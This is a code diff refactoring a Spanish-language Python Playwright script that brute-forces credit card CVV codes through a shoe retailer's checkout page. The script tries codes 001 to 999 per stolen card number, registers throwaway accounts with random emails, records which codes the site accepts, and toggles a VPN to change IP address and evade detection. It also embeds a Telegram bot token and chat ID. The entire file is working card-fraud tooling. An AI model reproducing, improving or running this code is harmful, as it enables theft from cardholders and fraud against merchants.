@@ -4,20 +4,26 @@ import re
 import random
 import string
 import platform
-import requests
 from pathlib import Path
-from multiprocessing import Process
 from playwright.sync_api import sync_playwright
 from colorama import Fore, Style
+import subprocess
 
+# Constantes de archivos
 EMAILS_FILE = "CORREOS.txt"
 USED_EMAILS_FILE = "emails_usados.txt"
 DATA_FILE = "DATA.txt"
 CVV_VALIDOS_FILE = "CVV_VALIDOS.txt"
 CVV_INVALIDOS_FILE = "CVV_INVALIDOS.txt"
 
-bot_token = '7909382477:AAFZOzQ1xBFD5JZGzpE3j3_UIjySllklis4'
-chat_id = '7163119135'
+# Literales de texto repetidos
+CVV_DOES_NOT_MATCH = "CVV2/CID does not match"
+TRANSACTION_DECLINED = "Your transaction was declined. Please use an alternative payment method."
+INPUT_NAME_SELECTOR = 'input#name'
+
+# Configuración de Telegram
+BOT_TOKEN = '7909382477:AAFZOzQ1xBFD5JZGzpE3j3_UIjySllklis4'
+CHAT_ID = '7163119135'
 
 class Colores:
     ROJO = '\033[91m'
@@ -28,26 +34,31 @@ class Colores:
 
 
 def generar_email():
+    """Genera un email aleatorio con un dominio común."""
     dominios = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com"]
     nombre = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
     return f"{nombre}@{random.choice(dominios)}"
 
-def get_start_cvv(numero, mes, ano):
+
+def get_start_cvv(card_number, month, year):
+    """Obtiene el siguiente CVV a probar para una tarjeta específica."""
     if not os.path.exists(CVV_INVALIDOS_FILE):
         return "001"
-    pattern = re.compile(rf"^{re.escape(numero)}\|{mes}\|{ano}\|(\d{{3}})$")
-    last = 0
-    with open(CVV_INVALIDOS_FILE, "r") as f:
-        for line in f:
-            m = pattern.match(line.strip())
-            if m:
-                cvv_int = int(m.group(1))
-                if cvv_int > last:
-                    last = cvv_int
-    siguiente = last + 1
-    return str(siguiente).zfill(3) if siguiente <= 999 else None
+    cvv_pattern = re.compile(rf"^{re.escape(card_number)}\|{month}\|{year}\|(\d{{3}})$")
+    max_cvv = 0
+    with open(CVV_INVALIDOS_FILE, "r") as file:
+        for line in file:
+            match = cvv_pattern.match(line.strip())
+            if match:
+                cvv_number = int(match.group(1))
+                if cvv_number > max_cvv:
+                    max_cvv = cvv_number
+    next_cvv = max_cvv + 1
+    return str(next_cvv).zfill(3) if next_cvv <= 999 else None
+
 
 def get_chrome_path():
+    """Devuelve la ruta del ejecutable de Chrome según el sistema operativo."""
     system = platform.system()
     if system == "Windows":
         return "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"
@@ -57,7 +68,9 @@ def get_chrome_path():
         return "/usr/bin/google-chrome"
     raise RuntimeError("Sistema operativo no compatible")
 
+
 def remover_tarjeta_de_data(numero, mes, ano):
+    """Elimina una tarjeta del archivo DATA.txt."""
     if not os.path.exists(DATA_FILE):
         return
     with open(DATA_FILE, "r") as f:
@@ -67,7 +80,9 @@ def remover_tarjeta_de_data(numero, mes, ano):
             if f"{numero}|{mes}|{ano}" not in linea:
                 f.write(linea)
 
+
 def capturar_mensaje_alerta(page):
+    """Captura el mensaje de alerta mostrado en la página."""
     try:
         page.wait_for_selector(".alert", state="visible", timeout=30000)
         page.wait_for_timeout(3000)
@@ -76,17 +91,19 @@ def capturar_mensaje_alerta(page):
                 texto = page.locator(sel).first.text_content()
                 if texto:
                     return texto
-            except:
+            except Exception:
                 pass
-        if page.get_by_text("CVV2/CID does not match").is_visible():
-            return "CVV2/CID does not match"
-        if page.get_by_text("Your transaction was declined. Please use an alternative payment method.").is_visible():
+        if page.get_by_text(CVV_DOES_NOT_MATCH).is_visible():
+            return CVV_DOES_NOT_MATCH
+        if page.get_by_text(TRANSACTION_DECLINED).is_visible():
             return "transaction declined"
         return "Mensaje de alerta desconocido"
-    except:
+    except Exception:
         return "No se capturó alerta"
 
+
 def preparar_checkout(page):
+    """Rellena el formulario de checkout con datos predefinidos."""
     page.goto("https://www.shoedazzle.com/purchase")
     page.get_by_role("button", name="continue checkout").click()
     page.locator('[data-autotag="shipping-firstname"]').fill("hysteria")
@@ -103,20 +120,22 @@ def preparar_checkout(page):
     page.locator('button[data-autotag="address-verification-confirmation-btn"]').click()
     try:
         page.locator("label").filter(has_text="I accept the terms of the").locator("div").first.click()
-    except:
+    except Exception:
         pass
 
+
 def editar_y_rellenar_pago(page, numero, mes, ano, cvv, nombre_tarjeta="hysteria", intento=1, max_intentos=6):
+    """Edita y rellena el formulario de pago, devolviendo el resultado del intento."""
     try:
         if intento > max_intentos:
             return "MAX_INTENTOS"
         if page.locator('button#edit-payment-information').is_visible():
             page.locator('button#edit-payment-information').click()
-            page.locator('input#name').wait_for(state="visible", timeout=5000)
+            page.locator(INPUT_NAME_SELECTOR).wait_for(state="visible", timeout=5000)
         else:
-            page.locator('input#name').wait_for(state="visible", timeout=5000)
+            page.locator(INPUT_NAME_SELECTOR).wait_for(state="visible", timeout=5000)
 
-        page.locator('input#name').fill(nombre_tarjeta)
+        page.locator(INPUT_NAME_SELECTOR).fill(nombre_tarjeta)
         tarjeta_fmt = ' '.join([numero[i:i+4] for i in range(0, len(numero), 4)])
         page.locator('input#number').fill(tarjeta_fmt)
         page.locator('input#expiration').fill(f"{mes}/{ano}")
@@ -141,14 +160,16 @@ def editar_y_rellenar_pago(page, numero, mes, ano, cvv, nombre_tarjeta="hysteria
         print(f"Error en editar_y_rellenar_pago: {e}")
         return None
 
+
 def evaluar_resultado_cvv(mensaje, numero, mes, ano, cvv, page, intento, max_intentos):
-    if "does not match" in mensaje or page.get_by_text("CVV2/CID does not match").is_visible():
+    """Evalúa el resultado del intento de CVV y toma acciones según el mensaje recibido."""
+    if CVV_DOES_NOT_MATCH in mensaje or page.get_by_text(CVV_DOES_NOT_MATCH).is_visible():
         print(Fore.RED + f"\u2716 {numero}|{mes}|{ano}|{cvv} -> CVV INCORRECTO" + Style.RESET_ALL)
         with open(CVV_INVALIDOS_FILE, "a") as f:
             f.write(f"{numero}|{mes}|{ano}|{cvv}\n")
         siguiente = str(int(cvv) + 1).zfill(3)
         if int(siguiente) <= 999 and intento < max_intentos:
-            return siguiente  # Devuelve el siguiente CVV para seguir iterando
+            return siguiente
         elif intento >= max_intentos:
             print("Se alcanzó el máximo de intentos de CVV.")
             return "MAX_INTENTOS"
@@ -156,9 +177,8 @@ def evaluar_resultado_cvv(mensaje, numero, mes, ano, cvv, page, intento, max_int
             print("Todos los CVVs posibles han sido probados sin éxito.")
         return None
 
-    if "declined" in mensaje or page.get_by_text("Your transaction was declined. Please use an alternative payment method.").is_visible():
+    if "declined" in mensaje or page.get_by_text(TRANSACTION_DECLINED).is_visible():
         print(Fore.GREEN + f"\u2611 {numero}|{mes}|{ano}|{cvv} -> CVV CORRECTO" + Style.RESET_ALL)
-        # enviar_mensaje(f"{numero}|{mes}|{ano}|{cvv} - CVV CORRECTO")
         with open(CVV_VALIDOS_FILE, "a") as f:
             f.write(f"{numero}|{mes}|{ano}|{cvv}\n")
         remover_tarjeta_de_data(numero, mes, ano)
@@ -170,7 +190,7 @@ def evaluar_resultado_cvv(mensaje, numero, mes, ano, cvv, page, intento, max_int
         return None
 
     if page.get_by_text("contact your bank to release the hold").is_visible():
-        print(f"RESULTADO DUDOSO: CVV CORRECTO (posiblemente bloqueada) : {cvv}")
+        print(Fore.YELLOW + f"RESULTADO DUDOSO: CVV CORRECTO (posiblemente bloqueada) : {cvv}" + Style.RESET_ALL)
         with open(CVV_VALIDOS_FILE, "a") as f:
             f.write(f"{numero}|{mes}|{ano}|{cvv}, posiblemente bloqueada\n")
         return None
@@ -180,15 +200,50 @@ def evaluar_resultado_cvv(mensaje, numero, mes, ano, cvv, page, intento, max_int
         f.write(f"{numero}|{mes}|{ano}|{cvv}\n")
     return None
 
-import subprocess
 
 def toggle_tunnelbear():
-    ahk_path = r"C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe"
+    """Ejecuta el script de AutoHotkey para alternar el estado de TunnelBear VPN."""
+    ahk_path = r"C:\\Program Files\\AutoHotkey\\v2\\AutoHotkey64.exe"
     script_path = os.path.abspath("scripttunnelbear.ahk")
     print(f"Running AutoHotkey script: {script_path}")
     subprocess.run([ahk_path, script_path], check=True)
 
+
+def lanzar_navegador_y_procesar(page, numero, mes, ano, cvv_actual, max_intentos):
+    """Realiza el flujo de automatización en el navegador y prueba los CVVs."""
+    intento = 1
+    next_cvv = None
+    while cvv_actual and intento <= max_intentos:
+        resultado = editar_y_rellenar_pago(page, numero, mes, ano, cvv_actual, intento=intento, max_intentos=max_intentos)
+        if resultado == "MAX_INTENTOS":
+            next_cvv = str(int(cvv_actual) + 1).zfill(3) if int(cvv_actual) < 999 else None
+            break
+        elif resultado and resultado.isdigit():
+            cvv_actual = resultado
+            intento += 1
+        else:
+            next_cvv = None
+            break
+    return next_cvv
+
+
+def iniciar_checkout(page, email):
+    """Realiza el flujo inicial de agregar producto y preparar checkout."""
+    page.goto("https://www.shoedazzle.com/products/Brooks-Western-Boot-HS2500629-9241")
+    page.get_by_role("button", name="Close").click()
+    page.get_by_role("button", name="VIP Add to Bag").click()
+    page.get_by_role("textbox", name="Email*").fill(email)
+    page.get_by_role("textbox", name="Password (6 character minimum)*").fill("hysteria100@")
+    page.get_by_role("button", name="Continue").click()
+    time.sleep(2)
+    for _ in range(5):
+        page.locator('[data-autotag="pdp_add_to_cart"]').click()
+        time.sleep(1)
+    preparar_checkout(page)
+
+
 def procesar_tarjeta(tarjeta_linea):
+    """Procesa una tarjeta probando diferentes CVVs hasta encontrar uno válido o agotar los intentos."""
     numero, mes, ano = tarjeta_linea.split("|")
     chrome_path = get_chrome_path()
     start_cvv = get_start_cvv(numero, mes, ano)
@@ -196,109 +251,74 @@ def procesar_tarjeta(tarjeta_linea):
     cvv_actual = start_cvv
     email = generar_email()
     while cvv_actual:
-        intento = 1
-        next_cvv = None
         with sync_playwright() as p:
             browser = p.chromium.launch(headless=False, executable_path=chrome_path)
             context = browser.new_context()
             page = context.new_page()
             try:
-                page.goto("https://www.shoedazzle.com/products/Brooks-Western-Boot-HS2500629-9241")
-                page.get_by_role("button", name="Close").click()
-                page.get_by_role("button", name="VIP Add to Bag").click()
-                page.get_by_role("textbox", name="Email*").fill(email)
-                page.get_by_role("textbox", name="Password (6 character minimum)*").fill("hysteria100@")
-                page.get_by_role("button", name="Continue").click()
-                time.sleep(2)
-                for _ in range(5):
-                    page.locator('[data-autotag="pdp_add_to_cart"]').click()
-                    time.sleep(1)
-                preparar_checkout(page)
-                while cvv_actual and intento <= max_intentos:
-                    resultado = editar_y_rellenar_pago(page, numero, mes, ano, cvv_actual, intento=intento, max_intentos=max_intentos)
-                    if resultado == "MAX_INTENTOS":
-                        next_cvv = str(int(cvv_actual) + 1).zfill(3) if int(cvv_actual) < 999 else None
-                        break
-                    elif resultado and resultado.isdigit():
-                        cvv_actual = resultado
-                        intento += 1
-                    else:
-                        next_cvv = None
-                        break
+                iniciar_checkout(page, email)
+                next_cvv = lanzar_navegador_y_procesar(page, numero, mes, ano, cvv_actual, max_intentos)
             except Exception as e:
                 print(f"[{numero}] Error: {e}")
+                next_cvv = None
             finally:
                 context.close()
                 browser.close()
         if next_cvv:
             print("Reiniciando IP con TunnelBear...")
             try:
-                toggle_tunnelbear()  # Apagar VPN
+                toggle_tunnelbear()
                 time.sleep(3)
-                toggle_tunnelbear()  # Prender VPN
+                toggle_tunnelbear()
                 time.sleep(15)
             except Exception as e:
                 print(f"Error al ejecutar el script de TunnelBear: {e}")
             cvv_actual = next_cvv
-            email = generar_email()  # Generar nuevo email tras reinicio VPN
-            continue
+            email = generar_email()
         else:
             break
 
-def main():
+
+def cargar_tarjetas_disponibles():
+    """Carga todas las tarjetas disponibles desde DATA.txt."""
     if not os.path.exists(DATA_FILE):
         print("DATA.txt no existe")
+        return []
+    with open(DATA_FILE, "r") as f:
+        return [line.strip() for line in f if "|" in line]
+
+
+def cargar_tarjetas_validadas():
+    """Carga los números de tarjetas que ya tienen un CVV válido."""
+    if not os.path.exists(CVV_VALIDOS_FILE):
+        return set()
+    with open(CVV_VALIDOS_FILE, "r") as f:
+        return set(line.strip().split("|")[0] for line in f if "|" in line)
+
+
+def main():
+    tarjetas = cargar_tarjetas_disponibles()
+    if not tarjetas:
         return
 
-    with open(DATA_FILE, "r") as f:
-        tarjetas = [line.strip() for line in f if "|" in line]
-
     tarjetas_usadas = set()
-    procesos_info = []
+    max_tarjetas = min(15, len(tarjetas))
 
-    for i in range(min(15, len(tarjetas))):
+    for i in range(max_tarjetas):
         tarjeta = tarjetas[i]
         tarjetas_usadas.add(tarjeta)
-        p = Process(target=procesar_tarjeta, args=(tarjeta,), name=f"Instancia-{i+1}")
-        procesos_info.append((p, tarjeta))
-        p.start()
-        time.sleep(6)
+        print(f"[INFO] Procesando tarjeta {i+1}/{max_tarjetas}: {tarjeta}")
+        procesar_tarjeta(tarjeta)
+        tarjetas_validadas = cargar_tarjetas_validadas()
+        numero = tarjeta.split("|")[0]
+        if numero in tarjetas_validadas:
+            print(f"[INFO] Se encontró CVV válido para {tarjeta}. Pasando a la siguiente tarjeta disponible.")
+        else:
+            print(f"[INFO] No se encontró CVV válido para {tarjeta}. Reintentando la misma tarjeta.")
+            procesar_tarjeta(tarjeta)
 
-    while True:
-        time.sleep(5)
-
-        tarjetas_validadas = set()
-        if os.path.exists(CVV_VALIDOS_FILE):
-            with open(CVV_VALIDOS_FILE, "r") as f:
-                tarjetas_validadas = set(line.strip().split("|")[0] for line in f if "|" in line)
-
-        for i, (p, tarjeta) in enumerate(procesos_info):
-            if not p.is_alive():
-                numero = tarjeta.split("|")[0]
-
-                if numero in tarjetas_validadas:
-                    print(f"[INFO] {p.name} encontró CVV válido. Cargando nueva tarjeta...")
-
-                    nueva_tarjeta = None
-                    for t in tarjetas:
-                        if t not in tarjetas_usadas:
-                            nueva_tarjeta = t
-                            break
-
-                    if nueva_tarjeta:
-                        tarjetas_usadas.add(nueva_tarjeta)
-                        nuevo_p = Process(target=procesar_tarjeta, args=(nueva_tarjeta,), name=p.name)
-                        procesos_info[i] = (nuevo_p, nueva_tarjeta)
-                        nuevo_p.start()
-                        time.sleep(6)
-                    else:
-                        print(f"[INFO] No quedan más tarjetas disponibles para {p.name}")
-                else:
-                    print(f"[INFO] {p.name} falló o fue interrumpido. Reintentando misma tarjeta...")
-                    nuevo_p = Process(target=procesar_tarjeta, args=(tarjeta,), name=p.name)
-                    procesos_info[i] = (nuevo_p, tarjeta)
-                    nuevo_p.start()
-                    time.sleep(6)
-
+    print("[INFO] Proceso secuencial finalizado. No quedan más tarjetas disponibles o todas han sido procesadas.")
+    
+    
 if __name__ == "__main__":
     main()
